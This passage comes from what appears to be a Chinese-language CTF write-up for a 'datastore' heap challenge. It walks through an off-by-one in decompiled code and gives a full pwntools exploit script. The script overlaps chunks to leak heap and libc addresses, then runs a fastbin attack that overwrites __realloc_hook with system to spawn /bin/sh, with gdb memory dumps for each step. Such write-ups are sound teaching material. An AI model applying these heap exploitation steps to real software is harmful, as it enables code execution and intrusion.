v3;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">-1</span> )</span><br><span class="line">      sub_1020();</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v5 = v1 - v0;</span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= v1 - v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="built_in">realloc</span>(v0, <span class="number">2</span> * v2);</span><br><span class="line">      v0 = v6;</span><br><span class="line">      <span class="keyword">if</span> ( !v6 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"FATAL: Out of memory"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v1 = &amp;v6[v5];</span><br><span class="line">      v2 = malloc_usable_size(v6);</span><br><span class="line">    &#125;</span><br><span class="line">    *v1++ = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  *v1 = <span class="number">0</span>;<span class="comment">//off-by-one</span></span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后师傅们利用堆块的重叠进行泄露地址，然后覆盖fd指针，然后fastbin attack，简单的说就是这样，先说明下整体攻击过程</p><ol><li>先删掉初始存在的堆块 th3fl4g，方便后续堆的布置及对齐</li><li>创建堆块，为后续做准备在创建同key堆块的时候，会删去上一个同key堆块</li><li>利用off-by-one覆盖下个chunk的pre_size，这里必须是0x18,0x38,0x78这种递增的，他realloc是按倍数递增的，如果我们用了0x18大小的key的话，会将下一个chunk的pre_size部分当数据块来用，在加上off-by-one覆盖掉size的insue位</li><li>先free掉第一块，为后续大堆块做准备</li><li>然后free第三块，这时候会向后合并堆块，根据pre_size合并成大堆块造成堆块重叠，这时候可以泄露地址了</li><li>申请堆块填充空间至chunk2</li><li>chunk2上为main_arena，泄露libc地址</li><li>现在堆块是重叠的，chunk3在我们free后的大堆块里，然后修改chunk3的fd指针指向realloc_hook</li><li>不破坏现场(不容易)</li><li>malloc一次，在malloc一次，这里有个点要注意，需要错位伪造size，因为fastbin有个checksize，我们这里将前面的0x7f错位，后面偏移也要补上</li><li>最后改掉后，在调用一次getshell</li></ol><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'datastore'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = ctx.start()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e.args)</span><br><span class="line">        print(<span class="string">"It can't work,may be it can't load the remote libc!"</span>)</span><br><span class="line">        print(<span class="string">"It will load the local process"</span>)</span><br><span class="line">        io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"><span class="comment"># FORTIFY:  Enabled</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GET</span><span class="params">(key)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"GET"</span>)</span><br><span class="line">    p.recvline(<span class="string">"PROMPT: Enter row key:"</span>)</span><br><span class="line">    p.sendline(key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PUT</span><span class="params">(key, size, data)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"PUT"</span>)</span><br><span class="line">    p.recvline(<span class="string">"PROMPT: Enter row key:"</span>)</span><br><span class="line">    p.sendline(key)</span><br><span class="line">    p.recvline(<span class="string">"PROMPT: Enter data size:"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvline(<span class="string">"PROMPT: Enter data:"</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DUMP</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"DUMP"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DEL</span><span class="params">(key)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"DEL"</span>)</span><br><span class="line">    p.recvline(<span class="string">"PROMPT: Enter row key:"</span>)</span><br><span class="line">    p.sendline(key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">    system_off = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    realloc_hook_off = libc.symbols[<span class="string">'__realloc_hook'</span>]</span><br><span class="line"></span><br><span class="line">    DEL(<span class="string">"th3fl4g"</span>)</span><br><span class="line"></span><br><span class="line">    PUT(<span class="string">"1"</span>*<span class="number">0x8</span>, <span class="number">0x80</span>, <span class="string">'A'</span>*<span class="number">0x80</span>)</span><br><span class="line">    PUT(<span class="string">"2"</span>*<span class="number">0x8</span>, <span class="number">0x18</span>, <span class="string">'B'</span>*<span class="number">0x18</span>)</span><br><span class="line">    PUT(<span class="string">"3"</span>*<span class="number">0x8</span>, <span class="number">0x60</span>, <span class="string">'C'</span>*<span class="number">0x60</span>)</span><br><span class="line">    PUT(<span class="string">"3"</span>*<span class="number">0x8</span>, <span class="number">0xf0</span>, <span class="string">'C'</span>*<span class="number">0xf0</span>)</span><br><span class="line">    PUT(<span class="string">"4"</span>*<span class="number">0x8</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x200</span>), <span class="number">0x20</span>, <span class="string">'D'</span>*<span class="number">0x20</span>)  <span class="comment"># off by one</span></span><br><span class="line"></span><br><span class="line">    DEL(<span class="string">"1"</span>*<span class="number">0x8</span>)</span><br><span class="line">    DEL(<span class="string">"3"</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">    PUT(<span class="string">"a"</span>, <span class="number">0x88</span>, p8(<span class="number">0</span>)*<span class="number">0x88</span>)</span><br><span class="line">    DUMP()</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"INFO: Dumping all rows.\n"</span>)</span><br><span class="line">    temp = p.recv(<span class="number">11</span>)</span><br><span class="line">    heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))<span class="number">-0x3f0</span></span><br><span class="line">    libc_base = int(p.recvline()[<span class="number">3</span>:<span class="number">-7</span>])<span class="number">-0x3be7b8</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">"heap_base: "</span> + hex(heap_base))</span><br><span class="line">    log.info(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">    realloc_hook_addr = libc_base + realloc_hook_off</span><br><span class="line">    log.info(<span class="string">"reallo_hook: 0x%x"</span> % realloc_hook_addr)</span><br><span class="line">    payload = p64(heap_base+<span class="number">0x70</span>)</span><br><span class="line">    payload += p64(<span class="number">0x8</span>)</span><br><span class="line">    payload += p64(heap_base+<span class="number">0x50</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    payload += p64(heap_base+<span class="number">0x250</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)</span><br><span class="line">    payload += p64(heap_base+<span class="number">0x3e0</span>)</span><br><span class="line">    payload += p64(<span class="number">0x88</span>)</span><br><span class="line">    payload += p64(heap_base+<span class="number">0xb0</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    payload += p64(heap_base+<span class="number">0x250</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x71</span>)</span><br><span class="line">    payload += p64(realloc_hook_addr<span class="number">-0x8</span><span class="number">-0x3</span><span class="number">-0x8</span>)</span><br><span class="line">    PUT(<span class="string">"6"</span>*<span class="number">0x8</span>, <span class="number">0xa8</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x41</span>)</span><br><span class="line">    payload += p64(heap_base+<span class="number">0x290</span>)</span><br><span class="line">    payload += p64(<span class="number">0x20</span>)</span><br><span class="line">    payload += p64(heap_base+<span class="number">0x3b0</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">    PUT(<span class="string">"c"</span>*<span class="number">0x8</span>, <span class="number">0x78</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)</span><br><span class="line">    payload += p64(heap_base+<span class="number">0x90</span>)</span><br><span class="line">    payload += p64(<span class="number">0x8</span>)+p64(heap_base+<span class="number">0x230</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x250</span>)</span><br><span class="line">    payload += p64(<span class="number">0x1</span>)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">    PUT(<span class="string">"d"</span>*<span class="number">0x8</span>, <span class="number">0x60</span>, payload)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">    system_addr = libc_base+system_off</span><br><span class="line">    print(<span class="string">"system_addr: 0x%x"</span> % system_addr)</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x3</span></span><br><span class="line">    payload += p64(system_addr)</span><br><span class="line">    payload += p8(<span class="number">0</span>)*(<span class="number">0x4d</span>+<span class="number">0x8</span>)</span><br><span class="line">    PUT(<span class="string">"e"</span>*<span class="number">0x8</span>, <span class="number">0x60</span>, payload)</span><br><span class="line">    payload = <span class="string">"/bin/sh"</span></span><br><span class="line">    payload += p8(<span class="number">0</span>)*<span class="number">0x12</span> </span><br><span class="line">    GET(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><h3 id="细节讲解"><a href="#细节讲解" class="headerlink" title="细节讲解"></a>细节讲解</h3><p>我只有exp部分是重点，其余创建堆块动作都是辅助的</p><h4 id="堆块重叠"><a href="#堆块重叠" class="headerlink" title="堆块重叠"></a>堆块重叠</h4><p><span class="exturl" data-url="aHR0cDovLzRuZ2VsYm95LmJsb2dzcG90LmNvbS8yMDE2LzEwL3NwYW4tZGlzcGxheS1ibG9jay1vdmVyZmxvdy1oaWRkZW5fMTAuaHRtbA==" title="http://4ngelboy.blogspot.com/2016/10/span-display-block-overflow-hidden_10.html">堆叠<i class="fa fa-external-link"></i></span><br>这篇文章讲的很好，图配的也很好，看下这部分就大概知道堆块重叠了<br>而这道题中，这里就是构造堆块重叠部分</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">system_off = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">realloc_hook_off = libc.symbols[<span class="string">'__realloc_hook'</span>]</span><br><span class="line"></span><br><span class="line">DEL(<span class="string">"th3fl4g"</span>)</span><br><span class="line"></span><br><span class="line">PUT(<span class="string">"1"</span>*<span class="number">0x8</span>, <span class="number">0x80</span>, <span class="string">'A'</span>*<span class="number">0x80</span>)</span><br><span class="line">PUT(<span class="string">"2"</span>*<span class="number">0x8</span>, <span class="number">0x18</span>, <span class="string">'B'</span>*<span class="number">0x18</span>)</span><br><span class="line">PUT(<span class="string">"3"</span>*<span class="number">0x8</span>, <span class="number">0x60</span>, <span class="string">'C'</span>*<span class="number">0x60</span>)</span><br><span class="line">PUT(<span class="string">"3"</span>*<span class="number">0x8</span>, <span class="number">0xf0</span>, <span class="string">'C'</span>*<span class="number">0xf0</span>)</span><br><span class="line">PUT(<span class="string">"4"</span>*<span class="number">0x8</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x200</span>), <span class="number">0x20</span>, <span class="string">'D'</span>*<span class="number">0x20</span>)  <span class="comment"># off by one</span></span><br><span class="line"></span><br><span class="line">DEL(<span class="string">"1"</span>*<span class="number">0x8</span>)</span><br><span class="line">DEL(<span class="string">"3"</span>*<span class="number">0x8</span>)</span><br></pre></td></tr></table></figure><h4 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PUT(<span class="string">"a"</span>, <span class="number">0x88</span>, p8(<span class="number">0</span>)*<span class="number">0x88</span>)</span><br><span class="line">DUMP()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"INFO: Dumping all rows.\n"</span>)</span><br><span class="line">temp = p.recv(<span class="number">11</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))<span class="number">-0x3f0</span></span><br><span class="line">libc_base = int(p.recvline()[<span class="number">3</span>:<span class="number">-7</span>])<span class="number">-0x3be7b8</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"heap_base: "</span> + hex(heap_base))</span><br><span class="line">log.info(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">realloc_hook_addr = libc_base + realloc_hook_off</span><br><span class="line">log.info(<span class="string">"reallo_hook: 0x%x"</span> % realloc_hook_addr)</span><br></pre></td></tr></table></figure><p>第一步put是为了将free掉的chunk移动到2处，这样才好泄露</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/50gx 0x562a3c9a8070-0x70</span><br><span class="line">0x562a3c9a8000:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x562a3c9a8010:	0x0000000000000000	0x0000000000000080</span><br><span class="line">0x562a3c9a8020:	0x0000562a3c9a80b0	0x0000000000000000</span><br><span class="line">0x562a3c9a8030:	0x0000000000000000	0x0000562a3c9a8140</span><br><span class="line">0x562a3c9a8040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x562a3c9a8050:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x562a3c9a8060:	0x4242424242424242	0x0000000000000021</span><br><span class="line">0x562a3c9a8070:	0x3232323232323232	0x0000000000000000</span><br><span class="line">0x562a3c9a8080:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x562a3c9a8090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x562a3c9a80a0:	0x0000000000000000	0x0000000000000301 <span class="comment">#free后合并的chunk</span></span><br><span class="line">0x562a3c9a80b0:	0x00007f14e88247b8	0x00007f14e88247b8</span><br><span class="line">0x562a3c9a80c0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x562a3c9a80d0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x562a3c9a80e0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x562a3c9a80f0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x562a3c9a8100:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x562a3c9a8110:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x562a3c9a8120:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x562a3c9a8130:	0x0000000000000090	0x0000000000000040 <span class="comment">#堆块2</span></span><br><span class="line">0x562a3c9a8140:	0x0000562a3c9a8070	0x0000000000000018</span><br><span class="line">0x562a3c9a8150:	0x0000562a3c9a8050	0x0000000000000000</span><br><span class="line">0x562a3c9a8160:	0x0000000000000000	0x0000562a3c9a8250</span><br><span class="line">0x562a3c9a8170:	0x0000000000000001	0x0000000000000041</span><br><span class="line">0x562a3c9a8180:	0x0000562a3c9a8000	0x00000000000000f0</span><br></pre></td></tr></table></figure><ol><li>为什么确定这里是堆块2，你可以看他的key指针，指向0x0000562a3c9a8070，这里正是0x32就是第二块</li><li>如果我们要泄露的话，就是通过覆盖堆块的数据部分的大小，也就是0x18那个大小，覆盖成0x562a3c9a80b0处存的地址，我们要将这个内容往下偏移多少要计算下</li><li>0x562a3c9a8140-0x562a3c9a80b0=0x90</li><li>所以我们下一个malloc的大小就是0x80-0x90之间了,不能是0x90，否则会变成0x100的chunk</li></ol><p>覆盖后结果如下，地址会变，因为我是两次调试，方便截图，实际偏移位置没变</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/50gx 0x55be33916070-0x70</span><br><span class="line">0x55be33916000:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x55be33916010:	0x0000000000000000	0x0000000000000080</span><br><span class="line">0x55be33916020:	0x000055be339160b0	0x0000000000000000</span><br><span class="line">0x55be33916030:	0x0000000000000000	0x000055be33916140</span><br><span class="line">0x55be33916040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55be33916050:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x55be33916060:	0x4242424242424242	0x0000000000000021</span><br><span class="line">0x55be33916070:	0x3232323232323232	0x0000000000000000</span><br><span class="line">0x55be33916080:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55be33916090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be339160a0:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x55be339160b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be339160c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be339160d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be339160e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be339160f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be33916100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be33916110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be33916120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be33916130:	0x0000000000000000	0x0000000000000271</span><br><span class="line">0x55be33916140:	0x00007fa9f416c7b8	0x00007fa9f416c7b8 <span class="comment">#覆盖了原来的0x18</span></span><br><span class="line">0x55be33916150:	0x000055be33916050	0x0000000000000000</span><br><span class="line">0x55be33916160:	0x0000000000000000	0x000055be33916250</span><br><span class="line">0x55be33916170:	0x0000000000000001	0x0000000000000041</span><br><span class="line">0x55be33916180:	0x000055be339163e0	0x0000000000000088</span><br></pre></td></tr></table></figure><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190829213254-81676342-ca61-1.png" alt="leak" title="leak"></p><h4 id="保护现场"><a href="#保护现场" class="headerlink" title="保护现场"></a>保护现场</h4><p>这步是比较难的，因为堆块申请的位置不确定，需要一步步调试确定，我建议每部署一部分，调试一次状况，然后在进行现场的保护</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(heap_base+<span class="number">0x70</span>)</span><br><span class="line">payload += p64(<span class="number">0x8</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x50</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(heap_base+<span class="number">0x250</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x3e0</span>)</span><br><span class="line">payload += p64(<span class="number">0x88</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0xb0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(heap_base+<span class="number">0x250</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x71</span>)</span><br><span class="line">payload += p64(realloc_hook_addr<span class="number">-0x8</span><span class="number">-0x3</span><span class="number">-0x8</span>)</span><br><span class="line">PUT(<span class="string">"6"</span>*<span class="number">0x8</span>, <span class="number">0xa8</span>, payload)</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x41</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x290</span>)</span><br><span class="line">payload += p64(<span class="number">0x20</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x3b0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">PUT(<span class="string">"c"</span>*<span class="number">0x8</span>, <span class="number">0x78</span>, payload)</span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x90</span>)</span><br><span class="line">payload += p64(<span class="number">0x8</span>)+p64(heap_base+<span class="number">0x230</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x250</span>)</span><br><span class="line">payload += p64(<span class="number">0x1</span>)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">PUT(<span class="string">"d"</span>*<span class="number">0x8</span>, <span class="number">0x60</span>, payload)</span><br><span class="line"><span class="comment">#3</span></span><br></pre></td></tr></table></figure><p>具体我怎么调试示范下，先在1处gdb.attach(p)</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/100gx 0x559717162000</span><br><span class="line">0x559717162000:	0x0000000000000000	0x0000000000000041 <span class="comment">#结构体chunk</span></span><br><span class="line">0x559717162010:	0x00005597171621c0	0x00000000000000a8</span><br><span class="line">0x559717162020:	0x0000559717162140	0x0000000000000000</span><br><span class="line">0x559717162030:	0x0000000000000000	0x0000559717162140</span><br><span class="line">0x559717162040:	0x0000000000000001	0x0000000000000021</span><br><span class="line">0x559717162050:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x559717162060:	0x4242424242424242	0x0000000000000021</span><br><span class="line">0x559717162070:	0x3232323232323232	0x0000000000000000</span><br><span class="line">0x559717162080:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x559717162090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5597171620a0:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x5597171620b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5597171620c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5597171620d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5597171620e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5597171620f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559717162100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559717162110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559717162120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559717162130:	0x0000000000000000	0x00000000000000b1 <span class="comment">#payload chunk </span></span><br><span class="line">0x559717162140:	0x0000559717162070	0x0000000000000008</span><br><span class="line">0x559717162150:	0x0000559717162050	0x0000559717162010</span><br><span class="line">0x559717162160:	0x0000000000000000	0x0000559717162250</span><br><span class="line">0x559717162170:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x559717162180:	0x00005597171623e0	0x0000000000000088</span><br><span class="line">0x559717162190:	0x00005597171620b0	0x0000000000000000</span><br><span class="line">0x5597171621a0:	0x0000000000000000	0x0000559717162250</span><br><span class="line">0x5597171621b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5597171621c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5597171621d0:	0x0000000000000000	0x0000000000000071</span><br><span class="line">0x5597171621e0:	0x00007fc9194dc71d	0x00000000000001c1 <span class="comment">#payload end</span></span><br><span class="line">0x5597171621f0:	0x00007fc9194dc7b8	0x00007fc9194dc7b8</span><br><span class="line">0x559717162200:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x559717162210:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x559717162220:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x559717162230:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x559717162240:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x559717162250:	0x0000559717162290	0x0000000000000020</span><br><span class="line">0x559717162260:	0x00005597171623b0	0x0000559717162140</span><br><span class="line">0x559717162270:	0x0000559717162180	0x0000000000000000</span><br><span class="line">0x559717162280:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x559717162290:	0x3434343434343434	0x0000000000000000</span><br><span class="line">0x5597171622a0:	0x0000000000000200	0x0000000000000100</span><br><span class="line">0x5597171622b0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x5597171622c0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x5597171622d0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x5597171622e0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x5597171622f0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x559717162300:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x559717162310:	0x4343434343434343	0x4343434343434343</span><br></pre></td></tr></table></figure><p>既然知道他会覆盖那部分，我就提前查看这部分内容，进行覆盖就行了，然后将gdb.attach放到合并堆块那会，查看具体内容，也就是在这</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gdb.attach(p)</span><br><span class="line">PUT(<span class="string">"a"</span>, <span class="number">0x88</span>, p8(<span class="number">0</span>)*<span class="number">0x88</span>)</span><br><span class="line">DUMP()</span><br></pre></td></tr></table></figure><p>查看具体内容，然后进行覆盖</p><ol><li><p>我上面所说的这是土方法，我测试出来的。</p></li><li><p>其实这些都可以预估的，前面DEL(1) DEL(3),所以会空闲两个结构体，这是fastbin部分的空闲堆块，所以结构体会在原来的chunk上建立，至于申请的0xa8不属于fastbin里，所以他会从大堆块里取，取出能存放0xa8大小的chunk，第二次put的话先申请一个结构体0x40大小的结构体存放红黑树结构，然后在申请0x78大小的chunk，都是从大堆块里取，因为此时fastbin里没有空闲堆块了，第一块用于PUT(“a”, 0x88, p8(0)<em>0x88),第二块用于PUT(“6”</em>0x8, 0xa8, payload)</p></li><li><p>PUT(“d”*0x8, 0x60, payload)这里先申请一个堆块，同时保护现场，因为原来是fastbin中的一个chunk指向了realloc_hook，现在申请过后，在申请一个堆块便是realloc_hook的地址了</p></li></ol><p>注意：还记得开头申请两个3吗，申请第二个3的时候会先删除前一个chunk，那个就是fastbin里0x70大小的chunk，所以我们覆盖的就是这个chunk的fd</p><h4 id="覆写realloc-hook"><a href="#覆写realloc-hook" class="headerlink" title="覆写realloc_hook"></a>覆写realloc_hook</h4><p>还记得我前面realloc_hook地址怎么写payload的吗<br>看<br>realloc_hook_addr-0x8-0x3-0x8<br>为什么要这么写呢？<br>先看看realloc_hook附近</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/5gx 0x7f14d2670730-0x10</span><br><span class="line">0x7f14d2670720 &lt;__memalign_hook&gt;:	0x00007f14d2335c90	0x0000000000000000</span><br><span class="line">0x7f14d2670730 &lt;__realloc_hook&gt;:	0x00007f14d2335c30	0x0000000000000000</span><br><span class="line">0x7f14d2670740 &lt;__malloc_hook&gt;:	0x0000000000000000</span><br></pre></td></tr></table></figure><p>你记得malloc_chunk是怎么样的吗？</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a "view" into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  